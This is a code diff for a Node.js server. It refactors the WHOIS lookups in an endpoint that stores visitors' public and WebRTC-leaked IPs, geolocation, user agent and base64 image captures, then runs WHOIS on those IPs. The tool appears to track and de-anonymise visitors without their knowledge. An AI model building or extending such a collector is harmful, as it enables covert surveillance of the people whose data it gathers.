@@ -4,7 +4,6 @@ const path = require('path');
 const crypto = require('crypto');
 const net = require('net');
 const PORT = 3000;
-const whois = require('whois');
 
 // --- Directories ---
 const PUBLIC_DIR = path.join(__dirname, 'public');
@@ -88,18 +87,17 @@ const RIR_SERVERS = {
   afrinic: 'whois.afrinic.net'
 };
 
-function runWhois(ip, cb) {
-  if (!net.isIP(ip)) return cb(`Invalid IP: ${ip}`);
+async function runWhois(ip) {
+  if (!net.isIP(ip)) return `Invalid IP: ${ip}`;
 
-  const rir = getRIR(ip);
-  const server = RIR_SERVERS[rir];
-
-  whois.lookup(ip, { server }, (err, data) => {
-    if (err) return cb(`WHOIS error: ${err.message}`);
-    cb(data || 'No WHOIS data found');
-  });
+  try {
+    const { default: whois } = await import('whois-json');
+    const data = await whois(ip);
+    return JSON.stringify(data, null, 2);
+  } catch (err) {
+    return `WHOIS error: ${err.message}`;
+  }
 }
-
 
 // --- IP label for HTML ---
 function ipLabel(ip, type) {
@@ -136,66 +134,69 @@ const server = http.createServer((req, res) => {
     return serveStatic(PUBLIC_DIR, '/user.html', res, 'text/html');
   }
 
-  if (req.url === '/collect' && req.method === 'POST') {
-    let body = '';
-    req.on('data', chunk => body += chunk);
-    req.on('end', () => {
-      try {
-        const data = JSON.parse(body);
-        let record = {
-          timestamp: new Date().toISOString(),
-          serverObservedIP: clientIP,
-          externalPublicIP: data.publicIP || null,
-          webrtcIPs: data.webrtcIPs || [],
-          geolocation: data.geolocation || null,
-          userAgent: data.userAgent || '',
-          whois: {},
-          images: [],
-          saved: false
-        };
+if (req.url === '/collect' && req.method === 'POST') {
+  let body = '';
+  req.on('data', chunk => body += chunk);
+  req.on('end', async () => {
+    try {
+      const data = JSON.parse(body);
+      let record = {
+        timestamp: new Date().toISOString(),
+        serverObservedIP: clientIP,
+        externalPublicIP: data.publicIP || null,
+        webrtcIPs: data.webrtcIPs || [],
+        geolocation: data.geolocation || null,
+        userAgent: data.userAgent || '',
+        whois: {},
+        images: [],
+        saved: false
+      };
 
-        if (data.images?.length) {
-          data.images.forEach(img => {
-            if (!img) return;
-            const imgName = `capture_${Date.now()}_${Math.floor(Math.random()*9999)}.png`;
-            fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(img, 'base64'));
-            record.images.push(imgName);
-          });
-        }
-
-        const ips = [];
-        if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
-        record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });
-
-        const finalize = () => {
-          if (!record.saved) {
-            record.saved = true;
-            saveRecord(record);
-            res.writeHead(200, {'Content-Type':'application/json'});
-            res.end(JSON.stringify({status:'ok'}));
-          }
-        };
-
-        if (ips.length === 0) finalize();
-        else {
-          let pending = ips.length;
-          ips.forEach(ip => {
-            runWhois(ip, out => {
-              record.whois[ip] = out;
-              pending--;
-              if (pending === 0) finalize();
-            });
-          });
-          setTimeout(finalize, 5000);
-        }
-
-      } catch (e) {
-        res.writeHead(400);
-        res.end('bad json');
+      // --- Save images ---
+      if (data.images?.length) {
+        data.images.forEach(img => {
+          if (!img) return;
+          const imgName = `capture_${Date.now()}_${Math.floor(Math.random()*9999)}.png`;
+          fs.writeFileSync(path.join(IMAGE_DIR, imgName), Buffer.from(img, 'base64'));
+          record.images.push(imgName);
+        });
       }
-    });
-    return;
-  }
+
+      // --- Collect IPs to lookup ---
+      const ips = [];
+      if (record.externalPublicIP && isPublicIP(record.externalPublicIP)) ips.push(record.externalPublicIP);
+      record.webrtcIPs.forEach(ip => { if (isPublicIP(ip)) ips.push(ip); });
+
+      const finalize = () => {
+        if (!record.saved) {
+          record.saved = true;
+          saveRecord(record);
+          res.writeHead(200, {'Content-Type':'application/json'});
+          res.end(JSON.stringify({status:'ok'}));
+        }
+      };
+
+      if (ips.length === 0) {
+        finalize();
+      } else {
+        try {
+          // --- Run WHOIS for all IPs using runWhois ---
+          const results = await Promise.all(ips.map(ip => runWhois(ip)));
+          ips.forEach((ip, idx) => { record.whois[ip] = results[idx]; });
+          finalize();
+        } catch (err) {
+          console.error(err);
+          finalize();
+        }
+      }
+
+    } catch (e) {
+      res.writeHead(400);
+      res.end('bad json');
+    }
+  });
+  return;
+}
 
   if (req.url === '/admin') {
     if (!['127.0.0.1','::1'].includes(clientIP)) {
